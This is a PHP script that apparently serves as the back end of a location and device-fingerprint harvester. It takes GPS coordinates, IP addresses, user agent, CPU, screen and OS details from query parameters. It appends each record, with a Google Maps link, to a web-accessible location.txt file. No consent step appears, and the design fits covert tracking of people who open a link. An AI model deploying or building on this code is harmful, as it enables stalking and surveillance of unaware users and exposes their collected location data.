<?php
// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Function to log and display errors
function handleError($message) {
    error_log($message);
    die("Error: Unable to process your request.");
}

// Check if all required GET parameters are set
$requiredParams = ['lat', 'long', 'uagent', 'ipv4', 'ipv6', 'timezone', 'language', 'cpuCores', 'screenResolution', 'cpuName', 'osName'];
$missingParams = [];

foreach ($requiredParams as $param) {
    if (!isset($_GET[$param])) {
        $missingParams[] = $param;
    }
}

if (!empty($missingParams)) {
    handleError("Missing parameters: " . implode(', ', $missingParams));
}

// Sanitize and validate input data
$latitude = isset($_GET['lat']) ? filter_var($_GET['lat'], FILTER_VALIDATE_FLOAT) : false;
$longitude = isset($_GET['long']) ? filter_var($_GET['long'], FILTER_VALIDATE_FLOAT) : false;
$userAgent = htmlspecialchars($_GET['uagent'], ENT_QUOTES, 'UTF-8');
$ipv4Address = filter_var($_GET['ipv4'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);
$ipv6Address = isset($_GET['ipv6']) && $_GET['ipv6'] ? filter_var($_GET['ipv6'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) : 'N/A';
$timezone = htmlspecialchars($_GET['timezone'], ENT_QUOTES, 'UTF-8');
$language = htmlspecialchars($_GET['language'], ENT_QUOTES, 'UTF-8');
$cpuCores = filter_var($_GET['cpuCores'], FILTER_VALIDATE_INT);
$screenResolution = htmlspecialchars($_GET['screenResolution'], ENT_QUOTES, 'UTF-8');
$cpuName = htmlspecialchars($_GET['cpuName'], ENT_QUOTES, 'UTF-8');
$osName = htmlspecialchars($_GET['osName'], ENT_QUOTES, 'UTF-8');

// Validate essential data
if ((!$ipv4Address && $ipv6Address === 'N/A') || $latitude === false || $longitude === false) {
    handleError("Invalid IP address or coordinates!");
}

date_default_timezone_set('Asia/Kolkata');
$dateTime = date('Y-m-d H:i:s');

$googleMapsLink = "https://www.google.com/maps?q=$latitude,$longitude";

// Prepare the data to write
$data = "Timestamp: $dateTime\n";
$data .= $ipv4Address ? "IP (IPv4): $ipv4Address\n" : '';
$data .= $ipv6Address !== 'N/A' ? "IP (IPv6): $ipv6Address\n" : '';
$data .= "Latitude: $latitude\n";
$data .= "Longitude: $longitude\n";
$data .= "User-Agent: $userAgent\n";
$data .= "Timezone: $timezone\n";
$data .= "Language: $language\n";
$data .= "CPU Cores: $cpuCores\n";
$data .= "Screen Resolution: $screenResolution\n";
$data .= "CPU Name: $cpuName\n";
$data .= "OS Name: $osName\n";
$data .= "Google Maps Link: $googleMapsLink\n";
$data .= "-------------------------\n";

// File path
$filePath = __DIR__ . "/location.txt";

try {
    // Check if file exists, if not create it
    if (!file_exists($filePath)) {
        if (file_put_contents($filePath, "") === false) {
            handleError("Failed to create location.txt file.");
        }
        // Set permissions to 0755 
        if (!chmod($filePath, 0755)) {
            handleError("Failed to set permissions for location.txt.");
        }
    }

    // Ensure file is writable
    if (!is_writable($filePath)) {
        handleError("location.txt is not writable. Check file permissions.");
    }

    // Write data to the file
    if (file_put_contents($filePath, $data, FILE_APPEND) !== false) {
        echo "Data saved successfully!";
    } else {
        handleError("Failed to write data to location.txt.");
    }
} catch (Exception $e) {
    // Log the error to a server-side log file
    error_log("Exception: " . $e->getMessage());
    handleError("An unexpected error occurred.");
}
